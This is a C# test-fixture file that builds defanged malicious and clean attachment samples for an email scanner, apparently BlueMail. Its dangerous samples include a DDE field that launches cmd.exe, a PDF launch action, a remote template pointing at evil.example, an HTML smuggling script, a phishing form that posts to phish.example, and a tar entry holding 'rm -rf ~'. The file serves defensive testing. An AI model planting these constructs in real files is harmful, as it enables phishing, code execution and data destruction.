using System.Buffers.Binary;
using System.IO.Compression;
using System.Text;
using BlueMail.Scanner;

namespace BlueMail.TestSamples;

/// <summary>
/// Scanner sample sets (PROMPT 2.6.4 "Đo chất lượng"). Every sample is built here, byte by byte: dangerous ones
/// have the structure that must be stopped (PE header, macro project, remote template, PDF launch action...) but
/// no working payload - no real malware is stored in the repository.
/// </summary>
public static class ScannerSamples
{
    public sealed record Sample(string Name, byte[] Data, ScanStatus Expected, string? ExpectedCode = null);

    private static byte[] Ascii(string s) => Encoding.ASCII.GetBytes(s);

    private static byte[] FakePe()
    {
        var b = new byte[512];
        b[0] = (byte)'M';
        b[1] = (byte)'Z';
        Ascii("This program cannot be run in DOS mode.").CopyTo(b, 78);
        return b;
    }

    public static byte[] Zip(params (string Name, byte[] Data)[] files)
    {
        using var ms = new MemoryStream();
        using (var z = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
        {
            foreach (var (name, data) in files)
            {
                using var e = z.CreateEntry(name, CompressionLevel.Optimal).Open();
                e.Write(data);
            }
        }

        return ms.ToArray();
    }

    /// <summary>Marks every entry as encrypted (general purpose bit 0) in local and central headers.</summary>
    private static byte[] MarkEncrypted(byte[] zip)
    {
        var z = (byte[])zip.Clone();
        for (var i = 0; i + 8 < z.Length; i++)
        {
            if (z[i] == 'P' && z[i + 1] == 'K' && ((z[i + 2] == 3 && z[i + 3] == 4) || (z[i + 2] == 1 && z[i + 3] == 2)))
            {
                var flagOffset = z[i + 2] == 3 ? i + 6 : i + 8;
                z[flagOffset] |= 0x01;
            }
        }

        return z;
    }

    private static byte[] Docx(params (string Name, string Content)[] extra)
    {
        var parts = new List<(string, byte[])>
        {
            ("[Content_Types].xml", Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>")),
            ("_rels/.rels", Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/></Relationships>")),
        };
        var hasDocument = extra.Any(e => e.Name == "word/document.xml");
        if (!hasDocument)
        {
            parts.Add(("word/document.xml", Encoding.UTF8.GetBytes("<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>Hợp đồng nguyên tắc</w:t></w:r></w:p></w:body></w:document>")));
        }

        parts.AddRange(extra.Select(e => (e.Name, Encoding.UTF8.GetBytes(e.Content))));
        return Zip([.. parts]);
    }

    /// <summary>Minimal compound file with the given storage names (and optionally the MSI class id on the root).</summary>
    private static byte[] Cfb(bool msi, params string[] storages)
    {
        const int sector = 512;
        var file = new byte[sector * 3]; // header, FAT sector (0), directory sector (1)
        new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 }.CopyTo(file, 0);
        BinaryPrimitives.WriteUInt16LittleEndian(file.AsSpan(0x1A), 3);
        BinaryPrimitives.WriteUInt16LittleEndian(file.AsSpan(0x1C), 0xFFFE);
        BinaryPrimitives.WriteUInt16LittleEndian(file.AsSpan(0x1E), 9);
        BinaryPrimitives.WriteUInt32LittleEndian(file.AsSpan(0x2C), 1); // one FAT sector
        BinaryPrimitives.WriteUInt32LittleEndian(file.AsSpan(0x30), 1); // first directory sector
        BinaryPrimitives.WriteUInt32LittleEndian(file.AsSpan(0x4C), 0); // DIFAT[0] = sector 0
        for (var i = 1; i < 109; i++)
        {
            BinaryPrimitives.WriteUInt32LittleEndian(file.AsSpan(0x4C + (i * 4)), 0xFFFFFFFF);
        }

        var fat = file.AsSpan(sector);
        fat.Fill(0xFF);
        BinaryPrimitives.WriteUInt32LittleEndian(fat, 0xFFFFFFFD);      // sector 0: FAT
        BinaryPrimitives.WriteUInt32LittleEndian(fat[4..], 0xFFFFFFFE); // sector 1: end of directory chain
        var names = new[] { "Root Entry" }.Concat(storages).Take(4).ToArray();
        for (var i = 0; i < names.Length; i++)
        {
            var entry = file.AsSpan((sector * 2) + (i * 128), 128);
            var n = Encoding.Unicode.GetBytes(names[i] + "\0");
            n.CopyTo(entry);
            BinaryPrimitives.WriteUInt16LittleEndian(entry[0x40..], (ushort)n.Length);
            entry[0x42] = (byte)(i == 0 ? 5 : 1);
            if (i == 0 && msi)
            {
                new Guid("000C1084-0000-0000-C000-000000000046").TryWriteBytes(entry.Slice(0x50, 16));
            }
        }

        return file;
    }

    private static byte[] Pdf(string body) => Ascii("%PDF-1.7\n" + body + "\ntrailer<</Root 1 0 R>>\n%%EOF\n");

    private static byte[] PdfWithFlateObject(string hiddenObject)
    {
        using var ms = new MemoryStream();
        using (var z = new ZLibStream(ms, CompressionLevel.Optimal, leaveOpen: true))
        {
            z.Write(Ascii(hiddenObject));
        }

        var compressed = ms.ToArray();
        var head = Ascii($"%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\n5 0 obj<</Type/ObjStm/Filter/FlateDecode/Length {compressed.Length}>>stream\n");
        return [.. head, .. compressed, .. Ascii("\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n")];
    }

    private static byte[] Gzip(string name, byte[] data)
    {
        using var ms = new MemoryStream();
        using (var gz = new GZipStream(ms, CompressionLevel.Optimal, leaveOpen: true))
        {
            gz.Write(data);
        }

        var b = ms.ToArray().ToList();
        // Insert FNAME: set FLG.FNAME and put the name after the 10-byte header.
        b[3] |= 0x08;
        b.InsertRange(10, Encoding.Latin1.GetBytes(name + "\0"));
        return [.. b];
    }

    private static byte[] Tar(params (string Name, byte[] Data)[] files)
    {
        var ms = new MemoryStream();
        foreach (var (name, data) in files)
        {
            var h = new byte[512];
            Ascii(name).CopyTo(h, 0);
            Ascii("0000644\0").CopyTo(h, 100);
            Ascii(Convert.ToString(data.Length, 8).PadLeft(11, '0') + "\0").CopyTo(h, 124);
            h[156] = (byte)'0';
            Ascii("ustar\0" + "00").CopyTo(h, 257);
            ms.Write(h);
            ms.Write(data);
            ms.Write(new byte[(512 - (data.Length % 512)) % 512]);
        }

        ms.Write(new byte[1024]);
        return ms.ToArray();
    }

    private static byte[] Rar5(string fileName)
    {
        static byte[] V(ulong v)
        {
            var r = new List<byte>();
            do
            {
                var b = (byte)(v & 0x7F);
                v >>= 7;
                r.Add(v > 0 ? (byte)(b | 0x80) : b);
            }
            while (v > 0);
            return [.. r];
        }

        byte[] Block(byte[] body) => [.. new byte[4], .. V((ulong)body.Length), .. body];
        var main = Block([.. V(1), .. V(0), .. V(0)]); // type 1 main, flags 0, archive flags 0
        var name = Encoding.UTF8.GetBytes(fileName);
        // type 2 (file), header flags 0x02 (data area), data size, file flags, unpacked size, attributes, compression, host OS, name
        var file = Block([.. V(2), .. V(0x02), .. V(4), .. V(0), .. V(4), .. V(0x20), .. V(0), .. V(1), .. V((ulong)name.Length), .. name]);
        var end = Block([.. V(5), .. V(0), .. V(0)]);
        return [.. Ascii("Rar!\x1A\x07\x01\x00"), .. main, .. file, .. "DATA"u8, .. end];
    }

    private static byte[] SevenZipEncodedHeader()
    {
        var b = new byte[64];
        new byte[] { (byte)'7', (byte)'z', 0xBC, 0xAF, 0x27, 0x1C, 0, 4 }.CopyTo(b, 0);
        BinaryPrimitives.WriteInt64LittleEndian(b.AsSpan(12), 0);  // next header right after the start header
        BinaryPrimitives.WriteInt64LittleEndian(b.AsSpan(20), 8);
        b[32] = 0x17; // kEncodedHeader
        return b;
    }

    private static byte[] Iso()
    {
        var b = new byte[0x8800];
        Ascii("CD001").CopyTo(b, 0x8001);
        b[0x8000] = 1;
        return b;
    }

    private static readonly byte[] Lnk = [0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46, 0, 0, 0, 0];
    private static readonly byte[] PngBytes = Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==");

    /// <summary>The EICAR test string - harmless by definition, recognised by antivirus engines as a test.</summary>
    public const string Eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    public static IReadOnlyList<Sample> Dangerous() =>
    [
        new("invoice.pdf", FakePe(), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("hoadon.js", Ascii("var s = new ActiveXObject('WScript.Shell');"), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("hoadon.pdf.exe", Ascii("not really a program"), ScanStatus.Malicious, ScanCodes.DoubleExtension),
        new("bao-cao\u202Efdp.scr", Ascii("x"), ScanStatus.Malicious, ScanCodes.BidiOverride),
        new("photo.jpg", Lnk, ScanStatus.Malicious, ScanCodes.BlockedType),
        new("scan.img", Iso(), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("disk.dat", Iso(), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("payroll.zip", Zip(("Bảng lương/setup.exe", FakePe())), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("docs.zip", Zip(("inner.zip", Zip(("readme.vbs", Ascii("MsgBox 1"))))), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("deep.zip", Zip(("1.zip", Zip(("2.zip", Zip(("3.zip", Zip(("4.zip", Zip(("x.txt", Ascii("x"))))))))))), ScanStatus.Suspicious, ScanCodes.ArchiveTooDeep),
        new("bomb.zip", Zip(("zeros.bin", new byte[64 * 1024 * 1024])), ScanStatus.Malicious, ScanCodes.ArchiveBomb),
        new("secret.zip", MarkEncrypted(Zip(("hop-dong.pdf", Pdf("1 0 obj<</Type/Catalog>>endobj")))), ScanStatus.Suspicious, ScanCodes.EncryptedArchive),
        new("bao-gia.docx", Docx(("word/vbaProject.bin", "VBA")), ScanStatus.Suspicious, ScanCodes.OfficeMacro),
        new("template.docx", Docx(("word/_rels/settings.xml.rels", "<Relationships><Relationship Id=\"r1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://evil.example/t.dotm\" TargetMode=\"External\"/></Relationships>")), ScanStatus.Malicious, ScanCodes.OfficeRemoteTemplate),
        new("dde.docx", Docx(("word/document.xml", "<w:document><w:body><w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"</w:instrText></w:r></w:p></w:body></w:document>")), ScanStatus.Malicious, ScanCodes.OfficeDde),
        new("legacy.doc", Cfb(false, "WordDocument", "Macros", "VBA"), ScanStatus.Suspicious, ScanCodes.OfficeMacro),
        new("update.doc", Cfb(true, "SummaryInformation"), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("open.pdf", Pdf("1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj 2 0 obj<</S/JavaScript/JS(app.alert(1))>>endobj"), ScanStatus.Malicious, ScanCodes.PdfJavaScript),
        new("hidden.pdf", PdfWithFlateObject("2 0 obj<</S/J#61vaScript/J#53(x)>>endobj 3 0 obj<</OpenAction 2 0 R>>endobj"), ScanStatus.Malicious, ScanCodes.PdfJavaScript),
        new("launch.pdf", Pdf("1 0 obj<</Type/Catalog/OpenAction<</S/Launch/F(cmd.exe)>>>>endobj"), ScanStatus.Malicious, ScanCodes.PdfLaunch),
        new("attach.pdf", Pdf("1 0 obj<</Type/Filespec/F(update.exe)/EF<</F 2 0 R>>>>endobj 2 0 obj<</Type/EmbeddedFile>>endobj"), ScanStatus.Malicious, ScanCodes.PdfEmbeddedExecutable),
        new("bill.html", Ascii("<html><body><script>var d=atob('" + new string('A', 6000) + "');var b=new Blob([new Uint8Array(1)]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='invoice.iso';a.click();</script></body></html>"), ScanStatus.Malicious, ScanCodes.HtmlSmuggling),
        new("login.html", Ascii("<html><body><form action=\"https://phish.example/collect\" method=post><input name=u><input type=\"password\" name=p></form></body></html>"), ScanStatus.Malicious, ScanCodes.HtmlCredentialForm),
        new("logo.svg", Ascii("<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('https://x.example')\"><circle r=\"4\"/></svg>"), ScanStatus.Malicious, ScanCodes.SvgScript),
        new("backup.tar", Tar(("tools/run.sh", Ascii("#!/bin/sh\nrm -rf ~")), ("notes.txt", Ascii("x"))), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("update.gz", Gzip("update.exe", FakePe()), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("files.rar", Rar5("Hồ sơ/install.msi"), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("files.7z", SevenZipEncodedHeader(), ScanStatus.Suspicious, ScanCodes.ArchiveUnlistable),
        new("eicar.com", Ascii(Eicar), ScanStatus.Malicious, ScanCodes.BlockedType),
        new("image.png", Pdf("1 0 obj<</Type/Catalog>>endobj"), ScanStatus.Suspicious, ScanCodes.ExtensionMismatch),
    ];

    public static IReadOnlyList<Sample> Clean() =>
    [
        new("Hợp đồng.pdf", Pdf("1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[]/Count 0/URI(https://bluemail.test)>>endobj"), ScanStatus.Clean),
        new("logo.png", PngBytes, ScanStatus.Clean),
        new("photo.jpg", [0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10, (byte)'J', (byte)'F', (byte)'I', (byte)'F', 0, 1], ScanStatus.Clean),
        new("Báo cáo quý 4.docx", Docx(), ScanStatus.Clean),
        new("bảng tính.xlsx", Zip(("[Content_Types].xml", Ascii("<Types/>")), ("xl/workbook.xml", Ascii("<workbook/>")), ("xl/worksheets/sheet1.xml", Ascii("<worksheet><sheetData><row><c><v>1</v></c></row></sheetData></worksheet>"))), ScanStatus.Clean),
        new("tai-lieu.zip", Zip(("a.pdf", Pdf("1 0 obj<</Type/Catalog>>endobj")), ("ghi-chu.txt", Encoding.UTF8.GetBytes("Ghi chú tiếng Việt")), ("photos/logo.png", PngBytes)), ScanStatus.Clean),
        new("danh-sach.csv", Encoding.UTF8.GetBytes("Họ tên,Email\nNguyễn Văn An,an@bluemail.test\n"), ScanStatus.Clean),
        new("会議.txt", Encoding.UTF8.GetBytes("明日の会議は10時からです。"), ScanStatus.Clean),
        new("تقرير.txt", Encoding.UTF8.GetBytes("مرحبا، المبيعات ارتفعت"), ScanStatus.Clean),
        new("forwarded.eml", Ascii("From: a@x.test\r\nSubject: hi\r\n\r\nbody\r\n"), ScanStatus.Clean),
        new("notes.txt.gz", Gzip("notes.txt", Encoding.UTF8.GetBytes("plain notes")), ScanStatus.Clean),
        new("archive.tar", Tar(("docs/readme.md", Ascii("# readme")), ("docs/data.csv", Ascii("a,b"))), ScanStatus.Clean),
        new("newsletter.html", Ascii("<!doctype html><html><body><h1>Tin tức</h1><p><a href=\"https://bluemail.test\">Đọc thêm</a></p></body></html>"), ScanStatus.Clean),
        new("report.doc", Cfb(false, "WordDocument", "SummaryInformation"), ScanStatus.Clean),
        new("eicar.txt", Ascii(Eicar), ScanStatus.Clean), // caught only by byte-pattern rules (layer 8, Phase 6)
    ];
}
